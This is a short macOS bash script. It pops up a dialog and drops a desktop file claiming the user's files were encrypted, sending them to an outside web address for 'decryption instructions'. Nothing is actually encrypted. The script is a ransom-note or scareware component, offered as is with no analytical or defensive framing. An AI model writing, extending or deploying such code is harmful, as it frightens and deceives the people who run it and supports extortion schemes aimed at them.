#!/bin/bash

osascript <<EOF
display dialog "Read the file 'whathappened.txt on your desktop.'" buttons {"OK"} default button "OK"
EOF
cd ~/Desktop/
touch whathappened.txt
echo "Your files were encrypted, go to https://jfrha-2-bd-12.vercel.app to get decryption instructions." > whathappened.txt
